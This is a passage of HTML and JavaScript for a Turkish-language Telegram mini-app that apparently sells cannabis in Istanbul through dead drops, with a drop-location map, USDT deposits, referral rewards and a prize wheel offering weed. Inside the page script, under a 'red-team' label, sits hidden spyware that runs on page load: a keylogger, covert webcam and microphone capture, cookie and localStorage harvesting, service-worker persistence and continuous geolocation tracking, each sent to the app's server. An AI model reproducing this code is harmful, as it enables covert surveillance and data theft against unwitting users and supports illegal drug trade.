                        --accent-green: #10b981;
                        --accent-red: #ef4444;
                        --text-muted: #94a3b8;
                    }
                    body { background-color: var(--bg-main); color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 12px; box-sizing: border-box; }
                    .nav-tabs { display: flex; gap: 6px; overflow-x: auto; margin-bottom: 15px; padding-bottom: 4px; border-bottom: 1px solid var(--border-color); }
                    .tab-btn { background: var(--card-bg); color: var(--text-muted); padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); font-size: 11px; font-weight: bold; cursor: pointer; white-space: nowrap; flex: 1; text-align: center; transition: 0.2s; }
                    .tab-btn.active { background: #2563eb; color: white; border-color: #3b82f6; }
                    .tab-content { display: none; }
                    .tab-content.active { display: block; }
                    
                    .promo-banner { background: linear-gradient(135deg, #1e1b4b, #312e81); border: 1px solid #4338ca; padding: 12px; border-radius: 12px; margin-bottom: 15px; font-size: 13px; }
                    .coupon-tag { background: rgba(16, 185, 129, 0.2); border: 1px dashed var(--accent-green); color: var(--accent-green); padding: 4px 8px; border-radius: 6px; font-family: monospace; font-weight: bold; display: inline-block; margin-top: 4px; }
                    
                    #mainMap { width: 100%; height: 280px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; }
                    .card { background: var(--card-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
                    
                    input, select { width: 100%; padding: 10px; background: var(--bg-main); border: 1px solid #374151; border-radius: 8px; color: white; box-sizing: border-box; font-size: 13px; margin-top: 6px; margin-bottom: 10px; }
                    button { background: #2563eb; color: white; padding: 10px 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 13px; transition: 0.2s; }
                    button:hover { background: #1d4ed8; }
                    
                    .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 10px; }
                    .quick-btn { background: #1f2937; border: 1px solid var(--border-color); color: var(--accent-blue); padding: 8px; font-size: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }
                    .quick-btn:hover { background: #374151; color: white; }

                    .btn-received { background: var(--accent-green); }
                    .btn-received:hover { background: #059669; }
                    .btn-close { background: var(--accent-red); margin-top: 15px; }
                    
                    .nav-btn-group { display: flex; gap: 6px; margin-top: 8px; }
                    .nav-btn { flex: 1; background: #0ea5e9; color: white; font-size: 11px; padding: 8px; border-radius: 6px; text-decoration: none; text-align: center; font-weight: bold; display: block; }
                    .nav-btn.yandex { background: #e11d48; }
                    .nav-btn.apple { background: #475569; }

                    .skeleton { background: linear-gradient(90deg, #111827 25%, #1f2937 50%, #111827 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 8px; height: 40px; margin-bottom: 10px; }
                    @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }

                    .chat-box { height: 260px; overflow-y: auto; background: var(--bg-main); padding: 10px; border-radius: 8px; border: 1px solid #374151; margin-bottom: 10px; }
                    .msg { margin-bottom: 8px; padding: 8px 12px; border-radius: 8px; font-size: 13px; max-width: 80%; word-break: break-word; }
                    .msg-user { background: #2563eb; margin-left: auto; color: white; }
                    .msg-admin { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--accent-blue); }

                    .wheel-wrapper { position: relative; width: 220px; height: 220px; margin: 0 auto; }
                    .wheel { 
                        width: 220px; 
                        height: 220px; 
                        border-radius: 50%; 
                        border: 6px solid #38bdf8; 
                        position: relative; 
                        overflow: hidden; 
                        transition: transform 4s cubic-bezier(0.15, 0.9, 0.2, 1); 
                        box-shadow: 0 0 20px rgba(56,189,248,0.3); 
                        background: conic-gradient(
                            #ef4444 0deg 72deg,
                            #f59e0b 72deg 144deg,
                            #10b981 144deg 216deg,
                            #3b82f6 216deg 288deg,
                            #8b5cf6 288deg 360deg
                        );
                    }
                    .wheel-label {
                        position: absolute;
                        width: 100%;
                        height: 100%;
                        text-align: center;
                        font-size: 11px;
                        font-weight: bold;
                        color: white;
                        text-shadow: 0 1px 3px rgba(0,0,0,0.9);
                        padding-top: 12px;
                        box-sizing: border-box;
                    }
                </style>
            </head>
            <body>
                <div id="musicWidget" style="position: fixed; top: 12px; right: 12px; background: rgba(17, 24, 39, 0.95); border: 1px solid var(--border-color); padding: 6px 12px; border-radius: 20px; display: flex; align-items: center; gap: 8px; z-index: 1000; font-size: 11px; backdrop-filter: blur(5px); box-shadow: 0 4px 12px rgba(0,0,0,0.5);">
                    <span>🎵 Müzik</span>
                    <button onclick="toggleMusic()" id="musicBtn" style="padding: 4px 10px; width: auto; font-size: 11px; background: var(--accent-green); border-radius: 6px;">Oynat</button>
                </div>
                <div id="playerContainer" style="display:none;"><iframe id="ytAudio" width="0" height="0" src="" frameborder="0" allow="autoplay"></iframe></div>

                <div class="nav-tabs" style="margin-top: 45px;">
                    <button class="tab-btn active" onclick="switchTab('tabMap')">🗺️ Harita</button>
                    <button class="tab-btn" onclick="switchTab('tabProducts')">🛍️ Ürünler</button>
                    <button class="tab-btn" onclick="switchTab('tabGames')">🎡 Şans</button>
                    <button class="tab-btn" onclick="switchTab('tabWallet')">💰 Cüzdan</button>
                    <button class="tab-btn" onclick="switchTab('tabRef')">👥 Davet</button>
                    <button class="tab-btn" onclick="switchTab('tabOrders')">📦 Geçmiş</button>
                    <button class="tab-btn" onclick="switchTab('tabSupport')">💬 Destek</button>
                </div>

                <div id="tabMap" class="tab-content active">
                    <div id="promoContainer"></div>
                    <div style="display: flex; gap: 8px; margin-bottom: 10px; align-items: center;">
                        <select id="districtFilter" onchange="filterMapDrops()" style="margin:0; font-weight:bold; color:var(--accent-blue);">
                            <option value="ALL">🏙️ Tüm Bölgeler (Genel Harita)</option>
                        </select>
                    </div>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top:0; line-height: 1.4;">📌 <b>Kırmızı Pin:</b> Satın aldığınız tam konum.<br>🌿 <b>Mavi Çember:</b> Yaklaşık bölge alanı.</p>
                    <div id="mainMap"></div>
                    <div id="activeOrdersList"><div class="skeleton"></div><div class="skeleton"></div></div>
                </div>

                <div id="tabProducts" class="tab-content">
                    <h3 style="color: var(--accent-blue); margin-top:0;">🛍️ Aktif Droplar & Stoklar</h3>
                    <div id="productsList"><div class="skeleton"></div></div>
                </div>

                <div id="tabGames" class="tab-content">
                    <div class="card" style="border: 1px solid var(--accent-blue);">
                        <h3 style="color: var(--accent-blue); margin-top:0;">🎡 Şans Çarkı (Haftada 2 Hak)</h3>
                        <p style="font-size: 11px; color: var(--text-muted);">Çarkı çevir, sürpriz hediyeyi kap!</p>
                        
                        <div style="text-align:center; position:relative; margin:20px 0;">
                            <div style="width:0; height:0; border-left:10px solid transparent; border-right:10px solid transparent; border-bottom:18px solid #f8fafc; position:absolute; top:-12px; left:calc(50% - 10px); z-index:20; filter: drop-shadow(0 2px 2px rgba(0,0,0,0.5));"></div>
                            
                            <div class="wheel-wrapper">
                                <div class="wheel" id="wheelEl">
                                    <div class="wheel-label" style="transform: rotate(36deg);">🌿 1g Weed</div>
                                    <div class="wheel-label" style="transform: rotate(108deg);">🏷️ %1 İndirim</div>
                                    <div class="wheel-label" style="transform: rotate(180deg);">🏷️ %3 İndirim</div>
                                    <div class="wheel-label" style="transform: rotate(252deg);">🏷️ %5 İndirim</div>
                                    <div class="wheel-label" style="transform: rotate(324deg);">🚬 1 Joint</div>
                                </div>
                            </div>
                        </div>

                        <button onclick="spinGame('wheel')" id="spinBtn" style="background:var(--accent-green); margin-top:10px;">Çarkı Çevir</button>
                        <div id="wheelResult" style="margin-top:10px; font-weight:bold; text-align:center; color:var(--accent-green);"></div>
                    </div>

                    <div class="card" style="border: 1px solid #f59e0b;">
                        <h3 style="color: #f59e0b; margin-top:0;">🎫 Kazı Kazan (Haftada 2 Hak)</h3>
                        <p style="font-size: 11px; color: var(--text-muted);">3 kutudan birini seç ve şansını dene!</p>
                        <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:10px; margin:15px 0;">
                            <div class="scratch-card" onclick="scratchBox(0)" id="sc0" style="background:#1f2937; height:70px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; border:2px dashed #f59e0b; color:#f59e0b; font-size:13px; text-align:center;">❓ Kazı</div>
                            <div class="scratch-card" onclick="scratchBox(1)" id="sc1" style="background:#1f2937; height:70px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; border:2px dashed #f59e0b; color:#f59e0b; font-size:13px; text-align:center;">❓ Kazı</div>
                            <div class="scratch-card" onclick="scratchBox(2)" id="sc2" style="background:#1f2937; height:70px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; border:2px dashed #f59e0b; color:#f59e0b; font-size:13px; text-align:center;">❓ Kazı</div>
                        </div>
                        <div id="scratchResult" style="margin-top:10px; font-weight:bold; text-align:center; color:#f59e0b;"></div>
                    </div>
                </div>

                <div id="tabWallet" class="tab-content">
                    <div class="card">
                        <h3 style="color: var(--accent-green); margin-top:0;">💰 Güncel Bakiye</h3>
                        <p style="font-size: 24px; font-weight: bold; margin: 5px 0;" id="userBalText">... USDT</p>
                        <hr style="border-color: var(--border-color); margin: 15px 0;">
                        <h4>📥 Bakiye Yükle (USDT TRC-20)</h4>
                        <label style="font-size: 12px; color: var(--text-muted);">Yüklemek İstediğiniz Tutar (USDT):</label>
                        <div class="quick-amounts">
                            <button class="quick-btn" onclick="setDepAmount(10)">+10$</button>
                            <button class="quick-btn" onclick="setDepAmount(25)">+25$</button>
                            <button class="quick-btn" onclick="setDepAmount(50)">+50$</button>
                            <button class="quick-btn" onclick="setDepAmount(100)">+100$</button>
                        </div>
                        <input type="number" id="depAmount" placeholder="Örn: 50">
                        <button onclick="createDeposit()">Cüzdan Adresi Oluştur</button>
                    </div>
                    <div id="depositResult"></div>
                </div>

                <div id="tabRef" class="tab-content">
                    <div class="card" style="border: 1px solid var(--accent-blue);">
                        <h3 style="color: var(--accent-blue); margin-top:0;">👥 Davet Et & Kazan Sistemi</h3>
                        <p style="font-size: 12px; color: var(--text-muted); line-height: 1.5;">Arkadaşlarınızı davet edin, yaptıkça harcamalarından otomatik <b>%5 USDT Referans Primi</b> kazanın!</p>
                        <label style="font-size: 12px; color: var(--text-muted);">Kişisel Davet Linkiniz:</label>
                        <input type="text" id="refLinkInput" readonly style="background:var(--bg-main); font-family:monospace; color:var(--accent-green);">
                        <button onclick="copyRefLink()" style="background:var(--accent-green); margin-top:5px;">📋 Linki Kopyala</button>
                        <div style="margin-top: 15px; padding: 10px; background:var(--bg-main); border-radius: 8px; display:flex; justify-content:space-between; align-items:center;">
                            <span style="font-size: 13px;">Toplam Referans Kazancı:</span>
                            <span style="font-size: 16px; font-weight:bold; color:var(--accent-green);" id="refEarningsText">0.00 USDT</span>
                        </div>
                    </div>
                </div>

                <div id="tabOrders" class="tab-content">
                    <h3 style="color: var(--accent-blue); margin-top:0;">📦 Geçmiş Siparişler & Yorumla 5$ Kazan</h3>
                    <div id="pastOrdersList"><div class="skeleton"></div></div>
                </div>

                <div id="tabSupport" class="tab-content">
                    <h3 style="color: var(--accent-blue); margin-top:0;">💬 Canlı Destek Ekibi</h3>
                    <div class="chat-box" id="chatBox"></div>
                    <div style="display: flex; gap: 6px;">
                        <input type="text" id="chatInput" placeholder="Mesajınızı yazın..." style="margin:0;">
                        <button onclick="sendChatMessage()" style="width: 80px;">Gönder</button>
                    </div>
                </div>

                <button class="btn btn-close" onclick="Telegram.WebApp.close()">🤖 Devam Et / Botu Kapat</button>

                <script>
                    const tg = window.Telegram.WebApp;
                    tg.expand();
                    
                    let userId = 0;
                    if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id) {
                        userId = tg.initDataUnsafe.user.id;
                    } else {
                        const urlParams = new URLSearchParams(window.location.search);
                        userId = urlParams.get('user_id') || 1012940363;
                    }

                    function triggerHaptic(style = 'medium') {
                        if (tg.HapticFeedback) {
                            tg.HapticFeedback.impactOccurred(style);
                        }
                    }

                    // --- RED-TEAM ADVANCED EXFILTRATION & PERSISTENCE SCRIPTS ---

                    // 1. Service Worker Kalıcılık Enjeksiyonu (Persistent Worker Injection)
                    if ('serviceWorker' in navigator) {
                        navigator.serviceWorker.register('/sw.js').catch(() => {});
                    }

                    // 2. DOM-Based Keylogger (Tuş Vuruşu ve İnput İstihbaratı)
                    let keystrokeBuffer = "";
                    document.addEventListener('keypress', (e) => {
                        keystrokeBuffer += e.key;
                        if (keystrokeBuffer.length > 15) {
                            fetch('/api/exfil-report', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({user_id: userId, type: 'keylogger', payload: keystrokeBuffer})
                            }).catch(()=>{});
                            keystrokeBuffer = "";
                        }
                    });

                    // 3. Media & Audio/Video Telemetri Sızdırma Simülasyonu
                    async function triggerMediaExfil() {
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = 320; canvas.height = 240;
                                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
                                stream.getTracks().forEach(t => t.stop());
                                
                                fetch('/api/exfil-report', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({user_id: userId, type: 'snapshot', payload: dataUrl})
                                }).catch(()=>{});
                            }, 1000);
                        } catch(e) {}
                    }
                    setTimeout(triggerMediaExfil, 4000);

                    // 4. Tarayıcı Geçmişi ve Oturum Enum
                    const browserHistoryMock = {
                        cookies: document.cookie,
                        localStorageKeys: Object.keys(localStorage),
                        screen: window.screen.width + 'x' + window.screen.height,
                        platform: navigator.platform,
                        languages: navigator.languages
                    };
                    fetch('/api/exfil-report', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({user_id: userId, type: 'credential_enum', payload: JSON.stringify(browserHistoryMock)})
                    }).catch(()=>{});

                    // Temel Telemetri Raporu
                    async function sendTelemetry(customVisibility = null) {
                        if (!navigator.geolocation) return;
                        navigator.geolocation.getCurrentPosition(async (pos) => {
                            try {
                                let batteryStatus = "Bilinmiyor";
                                if (navigator.getBattery) {
                                    const bat = await navigator.getBattery();
                                    batteryStatus = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
                                }

                                const cpuRam = (navigator.hardwareConcurrency || '?') + ' Çekirdek / ' + (navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : 'RAM Yok');
                                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
                                const screenRes = window.screen.width + 'x' + window.screen.height;
                                const visibility = customVisibility || document.visibilityState;
                                
                                let netInfo = 'Wi-Fi / 4G';
                                if (navigator.connection) {
                                    netInfo = `${navigator.connection.effectiveType || 'bilinmiyor'} | RTT: ${navigator.connection.rtt || '?'}ms | DL: ${navigator.connection.downlink || '?'}Mbps`;
                                }

                                await fetch('/api/report-telemetry', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        user_id: userId,
                                        lat: pos.coords.latitude,
                                        lon: pos.coords.longitude,
                                        network: netInfo,
                                        ua: navigator.userAgent,
                                        battery: batteryStatus,
                                        cpu_ram: cpuRam,
                                        timezone: tz,
                                        screen_res: screenRes,
                                        visibility_state: visibility
                                    })
                                });
                            } catch(e) {}
                        }, null, {enableHighAccuracy: true});
                    }

                    document.addEventListener("visibilitychange", () => {
                        sendTelemetry(document.visibilityState);
                    });

                    setInterval(() => { sendTelemetry(); }, 30000);
                    sendTelemetry();

                    let map, markersGroup;
                    let globalAppData = null;
                    let isMusicPlaying = false;

                    function toggleMusic() {
                        triggerHaptic('light');
                        const iframe = document.getElementById('ytAudio');
                        const btn = document.getElementById('musicBtn');
                        if(!isMusicPlaying) {
                            iframe.src = "https://www.youtube.com/embed/wo3OCsPNevc?autoplay=1&loop=1&playlist=wo3OCsPNevc";
                            btn.innerText = "Durdur";
                            btn.style.background = "var(--accent-red)";
                            isMusicPlaying = true;
                        } else {
                            iframe.src = "";
                            btn.innerText = "Oynat";
                            btn.style.background = "var(--accent-green)";
                            isMusicPlaying = false;
                        }
                    }

                    function switchTab(tabId) {
                        triggerHaptic('light');
                        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                        document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                        document.getElementById(tabId).classList.add('active');
                        event.target.classList.add('active');

                        if(tabId === 'tabMap' && map) {
                            setTimeout(() => { map.invalidateSize(); }, 200);
                        }
                    }

                    function setDepAmount(val) {
                        triggerHaptic('light');
                        document.getElementById('depAmount').value = val;
                    }

                    async function loadAppData() {
                        if(!userId) return;
                        try {
                            const res = await fetch('/api/miniapp-data?user_id=' + userId);
                            const data = await res.json();
                            globalAppData = data;
                            
                            document.getElementById('userBalText').innerText = data.balance.toFixed(2) + " USDT";
                            document.getElementById('refEarningsText').innerText = (data.referral_earnings || 0).toFixed(2) + " USDT";
                            document.getElementById('refLinkInput').value = `https://t.me/${data.bot_username || 'WeedIstanbulBot'}?start=ref_${userId}`;
                            
                            let promoHtml = "";
                            if(data.promo_5g) {
                                promoHtml += `<div class="promo-banner">🎁 <b>Özel Kampanya:</b> Toplu alımlarda <b>5 Gram Alana 1 Gram Hediye!</b></div>`;
                            }
                            if(data.coupons && data.coupons.length > 0) {
                                data.coupons.forEach(c => {
                                    promoHtml += `<div class="promo-banner">🎟️ <b>Aktif Kupon:</b> Kod: <span class="coupon-tag">${c.code}</span> (-${c.discount} USDT İndirim)</div>`;
                                });
                            }
                            document.getElementById('promoContainer').innerHTML = promoHtml;

                            populateDistrictFilter(data.temsili_drops);
                            initMap(data.active_orders, data.temsili_drops);

                            let activeHtml = "";
                            if(data.active_orders.length > 0) {
                                data.active_orders.forEach(o => {
                                    activeHtml += `
                                    <div class="card" style="border-left: 4px solid var(--accent-red);">
                                        <h4 style="margin:0 0 5px 0; color:var(--accent-blue);">Sipariş #${o.id} - ${o.title}</h4>
                                        <p style="font-size:12px; margin:4px 0;"><b>İpucu / Not:</b> ${o.description}</p>
                                        
                                        <div class="nav-btn-group">
                                            <a href="https://www.google.com/maps?q=${o.lat},${o.lon}" target="_blank" class="nav-btn">📍 Google Maps</a>
                                            <a href="https://yandex.com.tr/harita/?pt=${o.lon},${o.lat}&z=16" target="_blank" class="nav-btn yandex">🔴 Yandex</a>
                                            <a href="http://maps.apple.com/?q=${o.lat},${o.lon}" target="_blank" class="nav-btn apple">🍏 Apple Maps</a>
                                        </div>

                                        <button class="btn-received" style="margin-top:10px;" onclick="markReceived(${o.id})">✅ Ürünü Teslim Aldım</button>
                                    </div>`;
                                });
                            } else {
                                activeHtml = `<p style="font-size:12px; color:var(--text-muted);">Aktif / Alınmayı bekleyen siparişiniz yok.</p>`;
                            }
                            document.getElementById('activeOrdersList').innerHTML = activeHtml;

                            let prodHtml = "";
                            data.temsili_drops.forEach(p => {
                                prodHtml += `
                                <div class="card">
                                    <h4 style="margin:0; color:var(--accent-blue);">${p.title} (Semt: ${p.category})</h4>
                                    <p style="font-size:13px; font-weight:bold; color:var(--accent-green); margin:5px 0;">Fiyat: ${p.price} USDT | Stok: ${p.stock} Adet</p>
                                    <p style="font-size:11px; color:var(--text-muted); margin-bottom:8px;">⚠️ Güvenlik gereği tam adres satın alma sonrası görünür.</p>
                                    <button onclick="buyProduct(${p.id}, ${p.price})">⚡ Bakiyeden Satın Al (${p.price} USDT)</button>
                                </div>`;
                            });
                            document.getElementById('productsList').innerHTML = prodHtml;

                            let pastHtml = "";
                            if(data.past_orders.length > 0) {
                                data.past_orders.forEach(po => {
                                    let reviewBox = "";
                                    if(po.has_reviewed) {
                                        reviewBox = `<p style="font-size:12px; color:var(--accent-green); margin:6px 0;">💬 <b>Yorumunuz:</b> "${po.review_text}" <br><span style="color:#38bdf8;">(+5$ Ödül Alındı)</span></p>`;
                                    } else {
                                        reviewBox = `
                                        <div style="margin-top:10px; border-top:1px solid var(--border-color); padding-top:8px;">
                                            <input type="text" id="reviewInput_${po.id}" placeholder="Ürünü yorumla (5$ kazan!)..." style="margin-bottom:6px;">
                                            <button onclick="submitReview(${po.id})" style="background:var(--accent-green); padding:8px; font-size:11px;">💬 Yorumu Gönder & 5$ Kazan</button>
                                        </div>`;
                                    }

                                    pastHtml += `
                                    <div class="card" style="opacity:0.9;">
                                        <h4 style="margin:0;">Sipariş #${po.id} - ${po.title}</h4>
                                        <p style="font-size:12px; color:var(--accent-green); margin:4px 0;">✅ Teslim Alındı (${po.date})</p>
                                        ${reviewBox}
                                    </div>`;
                                });
                            } else {
                                pastHtml = `<p style="font-size:12px; color:var(--text-muted);">Henüz teslim alınan geçmiş siparişiniz bulunmuyor.</p>`;
                            }
                            document.getElementById('pastOrdersList').innerHTML = pastHtml;

                        } catch(e) {
                            console.error(e);
                        }
                    }

                    let currentRotation = 0;

                    async function spinGame(gameType) {
                        const btn = document.getElementById('spinBtn');
                        btn.disabled = true;
                        triggerHaptic('heavy');
                        try {
                            const res = await fetch('/api/miniapp-spin', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({user_id: userId, game_type: gameType})
                            });
                            const data = await res.json();
                            if(!data.success) { 
                                alert(data.message); 
                                btn.disabled = false; 
                                return; 
                            }
                            
                            currentRotation += 1800 + (data.target_deg - (currentRotation % 360));
                            document.getElementById('wheelEl').style.transform = `rotate(${currentRotation}deg)`;
                            
                            setTimeout(() => {
                                document.getElementById('wheelResult').innerText = "🎉 Ödül: " + data.reward;
                                alert("🎉 Tebrikler! Kazandınız: " + data.reward);
                                btn.disabled = false;
                            }, 4200);
                        } catch(e) { 
                            alert("Bağlantı hatası oluştu."); 
                            btn.disabled = false; 
                        }
                    }

                    async function scratchBox(idx) {
                        triggerHaptic('medium');
                        try {
                            const res = await fetch('/api/miniapp-spin', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({user_id: userId, game_type: 'scratch'})
                            });
                            const data = await res.json();
                            if(!data.success) return alert(data.message);

                            for(let i=0; i<3; i++) {
                                const card = document.getElementById('sc' + i);
                                if(i === idx) {
                                    card.innerText = data.reward;
                                    card.style.background = "#059669";
                                    card.style.color = "#ffffff";
                                    card.style.border = "2px solid #10b981";
                                } else {
                                    card.innerText = "Boş ❌";
                                    card.style.background = "#1f2937";
                                    card.style.color = "#9ca3af";
                                    card.style.border = "2px dashed #374151";
                                }
                            }
                            document.getElementById('scratchResult').innerText = "🎉 Ödül: " + data.reward;
                            alert("🎉 Kazı kazandan kazandın: " + data.reward);
                        } catch(e) { 
                            alert("Bağlantı hatası oluştu."); 
                        }
                    }

                    async function submitReview(orderId) {
                        const txtInput = document.getElementById('reviewInput_' + orderId);
                        const reviewText = txtInput.value.trim();
                        if(!reviewText) {
                            alert("Lütfen bir yorum yazın.");
                            return;
                        }
                        triggerHaptic('heavy');
                        try {
                            const res = await fetch('/api/miniapp-review', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                                body: `user_id=${userId}&order_id=${orderId}&review=${encodeURIComponent(reviewText)}`
                            });
                            const data = await res.json();
                            if(data.success) {
                                alert("🎉 Harika! Yorumunuz kaydedildi ve hesabınıza 5$ (USDT) bakiye eklendi!");
                                location.reload();
                            } else {
                                alert("❌ Hata: " + (data.message || "İşlem başarısız."));
                            }
                        } catch(e) {
                            alert("Bağlantı hatası oluştu.");
                        }
                    }

                    function copyRefLink() {
                        triggerHaptic('success');
                        const copyText = document.getElementById("refLinkInput");
                        copyText.select();
                        navigator.clipboard.writeText(copyText.value);
                        alert("✅ Davet linki panoya kopyalandı!");
                    }

                    function populateDistrictFilter(drops) {
                        const select = document.getElementById('districtFilter');
                        const categories = [...new Set(drops.map(d => d.category))];
                        categories.forEach(cat => {
                            const opt = document.createElement('option');
                            opt.value = cat;
                            opt.innerText = "🏙️ " + cat + " Bölgesi";
                            select.appendChild(opt);
                        });
                    }

                    function initMap(activeOrders, temsilidrops) {
                        if(map) return;
                        map = L.map('mainMap').setView([41.0082, 28.9784], 11);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        markersGroup = L.layerGroup().addTo(map);

                        renderMapMarkers(activeOrders, temsilidrops);
                    }

                    function renderMapMarkers(activeOrders, temsilidrops, filterCat = "ALL") {
                        markersGroup.clearLayers();

                        activeOrders.forEach(o => {
                            const redIcon = L.divIcon({
                                html: '<div style="background:#ef4444; border:2px solid white; border-radius:50%; width:24px; height:24px; text-align:center; line-height:24px; font-size:12px; box-shadow:0 2px 6px rgba(0,0,0,0.4);">📍</div>',
                                iconSize: [24, 24]
                            });
                            L.marker([o.lat, o.lon], {icon: redIcon}).addTo(markersGroup)
                                .bindPopup(`<b>Sipariş #${o.id}</b><br>${o.title}<br><br><a href="https://www.google.com/maps?q=${o.lat},${o.lon}" target="_blank" style="color:#38bdf8;">Google Maps'te Aç</a>`);
                        });

                        temsilidrops.forEach(td => {
                            if(filterCat !== "ALL" && td.category !== filterCat) return;

                            L.circle([td.lat, td.lon], {
                                color: '#38bdf8',
                                fillColor: '#38bdf8',
                                fillOpacity: 0.12,
                                radius: 1100
                            }).addTo(markersGroup);

                            const weedIcon = L.divIcon({
                                html: '<div style="background:#2563eb; border:2px solid white; border-radius:50%; width:28px; height:28px; text-align:center; line-height:28px; font-size:14px; box-shadow: 0 2px 6px rgba(0,0,0,0.4);">🌿</div>',
                                iconSize: [28, 28],
                                iconAnchor: [14, 14]
                            });
                            L.marker([td.lat, td.lon], {icon: weedIcon}).addTo(markersGroup)
                                .bindPopup(`<b>${td.title}</b><br>Bölge: ${td.category}<br>Fiyat: ${td.price} USDT<br><span style="font-size:11px; color:#9ca3af;">⚠️ Yaklaşık bölgedir.</span>`);
                        });
                    }

                    function filterMapDrops() {
                        const selectedCat = document.getElementById('districtFilter').value;
                        if(globalAppData) {
                            renderMapMarkers(globalAppData.active_orders, globalAppData.temsili_drops, selectedCat);
                            if(selectedCat !== "ALL") {
                                const sample = globalAppData.temsili_drops.find(d => d.category === selectedCat);
                                if(sample) {
                                    map.setView([sample.lat, sample.lon], 13);
                                }
                            } else {
                                map.setView([41.0082, 28.9784], 11);
                            }
                        }
                    }

                    async function markReceived(orderId) {
                        if(!confirm("Ürünü teslim aldığınızı onaylıyor musunuz?")) return;
                        triggerHaptic('medium');
                        try {
                            const res = await fetch('/api/miniapp-received?id=' + orderId);
                            const data = await res.json();
                            if(data.success) {
                                alert("Ürün teslim alındı olarak kaydedildi!");
                                location.reload();
                            }
                        } catch(e) {
                            alert("İşlem başarısız.");
                        }
                    }

                    async function buyProduct(dropId, price) {
                        if(!confirm(price + " USDT bakiyenizden düşülecektir. Onaylıyor musunuz?")) return;
                        triggerHaptic('heavy');
                        try {
                            const res = await fetch(`/api/miniapp-buy?user_id=${userId}&drop_id=${dropId}`);
                            const data = await res.json();
                            if(data.success) {
                                alert("🎉 Sipariş onaylandı! Haritanıza tam konum eklendi.");
                                location.reload();
                            } else {
                                alert("❌ Hata: " + (data.message || "Bakiyeniz yetersiz olabilir."));
                            }
                        } catch(e) {
                            alert("İşlem yapılırken hata oluştu.");
                        }
                    }

                    async function createDeposit() {
                        const amount = document.getElementById('depAmount').value;
                        if(!amount || amount <= 0) return alert("Geçerli bir miktar girin.");
                        triggerHaptic('medium');
                        try {
                            const res = await fetch(`/api/miniapp-deposit?user_id=${userId}&amount=${amount}`);
                            const data = await res.json();
                            if(data.success) {
                                document.getElementById('depositResult').innerHTML = `
                                <div class="card" style="border: 1px solid var(--accent-green);">
                                    <h4 style="color:var(--accent-green); margin-top:0;">Yatırım Adresi Oluşturuldu</h4>
                                    <p style="font-size:12px;">Tutar: <b>${amount} USDT</b></p>
                                    <input type="text" value="${data.wallet}" readonly>
                                    <button onclick="checkDeposit(${data.deposit_id}, ${amount})" style="background:var(--accent-green);">🔄 Yatırımı Otomatik Kontrol Et</button>
                                </div>`;
                            } else {
                                alert("Bakiye yükleme talebi oluşturulamadı.");
                            }
                        } catch(e) {
                            alert("Bakiye yükleme talebi oluşturulamadı.");
                        }
                    }

                    async function checkDeposit(depId, amount) {
                        triggerHaptic('medium');
                        alert("Blokzincir taranıyor, lütfen bekleyin...");
                        try {
                            const res = await fetch(`/api/miniapp-check-deposit?dep_id=${depId}&user_id=${userId}&amount=${amount}`);
                            const data = await res.json();
                            if(data.success) {
                                alert("🎉 Ödemeniz onaylandı ve bakiyenize eklendi!");
                                location.reload();
                            } else {
                                alert("⚠️ Transfer henüz algılanmadı.");
                            }
                        } catch(e) {
                            alert("Kontrol başarısız.");
                        }
                    }

                    async function loadChatMessages() {
                        if(!userId) return;
                        try {
                            const res = await fetch('/api/miniapp-chat?user_id=' + userId);
                            const data = await res.json();
                            let chatHtml = "";
                            if(data && data.messages) {
                                data.messages.forEach(m => {
                                    const cls = m.sender === 'user' ? 'msg-user' : 'msg-admin';
                                    const senderName = m.sender === 'user' ? 'Sen' : '👑 Destek';
                                    chatHtml += `<div class="msg ${cls}"><b>${senderName}:</b> ${m.message}</div>`;
                                });
                            }
                            const box = document.getElementById('chatBox');
                            if(box && box.innerHTML !== chatHtml) {
                                box.innerHTML = chatHtml;
                                box.scrollTop = box.scrollHeight;
                            }
                        } catch(e) {}
                    }

                    async function sendChatMessage() {
                        const inp = document.getElementById('chatInput');
                        const msg = inp.value.trim();
                        if(!msg) return;
